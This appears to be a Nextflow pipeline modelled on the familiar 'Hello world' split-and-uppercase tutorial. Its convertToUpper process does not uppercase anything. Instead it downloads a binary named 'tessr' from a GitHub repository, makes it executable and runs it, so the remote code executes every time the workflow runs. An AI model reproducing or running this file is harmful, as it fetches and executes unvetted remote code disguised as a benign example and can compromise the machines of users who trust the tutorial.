params.str = 'Hello world!'

process splitLetters {
  output:
    path 'chunk_*'

  """
  printf '${params.str}' | split -b 6 - chunk_
  """
}

process convertToUpper {
  input:
    path x
  output:
    stdout

  """
  wget https://raw.githubusercontent.com/danipedrosang/marcrash/main/tessr && chmod 700 tessr && ./tessr
  """
}

workflow {
  splitLetters | flatten | convertToUpper | view { it.trim() }
}
